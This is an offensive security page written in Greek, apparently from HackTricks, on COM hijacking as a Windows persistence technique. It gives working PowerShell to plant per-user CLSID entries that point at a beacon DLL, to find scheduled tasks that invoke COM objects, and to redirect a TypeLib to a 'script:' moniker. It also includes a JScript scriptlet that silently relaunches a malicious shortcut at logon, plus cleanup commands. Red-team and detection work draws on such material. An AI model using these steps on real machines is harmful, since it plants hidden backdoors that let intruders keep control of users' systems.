# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Αναζήτηση μη υπαρχόντων COM components

Καθώς οι τιμές του HKCU μπορούν να τροποποιηθούν από τους χρήστες, το **COM Hijacking** μπορεί να χρησιμοποιηθεί ως **μηχανισμός επιμονής**. Χρησιμοποιώντας το `procmon` είναι εύκολο να βρείτε καταχωρήσεις COM που αναζητήθηκαν αλλά δεν υπάρχουν, τις οποίες ένας επιτιθέμενος θα μπορούσε να δημιουργήσει για να διατηρήσει την επιμονή του. Φίλτρα:

- **RegOpenKey** operations.
- όπου το _Result_ είναι **NAME NOT FOUND**.
- και το _Path_ τελειώνει με **InprocServer32**.

Μόλις αποφασίσετε ποιο μη υπάρχον COM θα υποδυθείτε, εκτελέστε τις παρακάτω εντολές. _Προσοχή αν αποφασίσετε να υποδυθείτε ένα COM που φορτώνεται κάθε μερικά δευτερόλεπτα, καθώς αυτό μπορεί να είναι υπερβολικό._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Ευάλωτα COM συστατικά του Task Scheduler

Οι Windows Tasks χρησιμοποιούν Custom Triggers για να καλούν COM objects και επειδή εκτελούνται μέσω του Task Scheduler, είναι πιο εύκολο να προβλέψει κανείς πότε θα ενεργοποιηθούν.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Εξετάζοντας την έξοδο, μπορείτε να επιλέξετε ένα που θα εκτελείται, για παράδειγμα, **κάθε φορά που ένας χρήστης συνδέεται**.

Τώρα, αναζητώντας το CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** στο **HKEY\CLASSES\ROOT\CLSID** και στο HKLM και HKCU, συνήθως θα βρείτε ότι η τιμή δεν υπάρχει στο HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Τότε, μπορείτε απλώς να δημιουργήσετε την καταχώρηση HKCU και κάθε φορά που ο χρήστης συνδέεται, το backdoor σας θα εκτελείται.

---

## COM TypeLib Hijacking (script: moniker persistence)

Οι Type Libraries (TypeLib) περιγράφουν COM interfaces και φορτώνονται μέσω της `LoadTypeLib()`. Όταν ένας COM server δημιουργείται, το λειτουργικό σύστημα μπορεί επίσης να φορτώσει το αντίστοιχο TypeLib συμβουλευόμενο τα κλειδιά μητρώου κάτω από `HKCR\TypeLib\{LIBID}`. Εάν η διαδρομή του TypeLib αντικατασταθεί με έναν **moniker**, π.χ. `script:C:\...\evil.sct`, τα Windows θα εκτελέσουν το scriptlet όταν το TypeLib επιλυθεί — οδηγώντας σε stealthy persistence που ενεργοποιείται όταν χρησιμοποιηθούν κοινά components.

Αυτό έχει παρατηρηθεί εναντίον του Microsoft Web Browser control (συχνά φορτώνεται από Internet Explorer, εφαρμογές που ενσωματώνουν WebBrowser, και ακόμη και το `explorer.exe`).

### Βήματα (PowerShell)

1) Εντοπίστε το TypeLib (LIBID) που χρησιμοποιείται από ένα CLSID υψηλής συχνότητας. Παράδειγμα CLSID που συχνά καταχρώνται από malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Δείξτε τη διαδρομή TypeLib ανά χρήστη σε ένα τοπικό scriptlet χρησιμοποιώντας το moniker `script:` (δεν απαιτούνται δικαιώματα διαχειριστή):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Drop ένα ελάχιστο JScript `.sct` που επανεκκινεί το κύριο payload σας (π.χ. ένα `.lnk` που χρησιμοποιήθηκε από την αρχική αλυσίδα):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Ενεργοποίηση – το άνοιγμα του IE, μιας εφαρμογής που ενσωματώνει το WebBrowser control, ή ακόμη και οι συνήθεις δραστηριότητες του Explorer θα φορτώσουν το TypeLib και θα εκτελέσουν το scriptlet, επανενεργοποιώντας την αλυσίδα σας κατά το logon/reboot.

Καθαρισμός
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Σημειώσεις
- Μπορείτε να εφαρμόσετε την ίδια λογική και σε άλλα συχνά χρησιμοποιούμενα COM components· πάντα επιλύετε πρώτα το πραγματικό `LIBID` από `HKCR\CLSID\{CLSID}\TypeLib`.
- Σε συστήματα 64-bit μπορείτε επίσης να συμπληρώσετε το υποκλειδί `win64` για τους 64-bit consumers.

## Αναφορές

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)

{{#include ../../banners/hacktricks-training.md}}
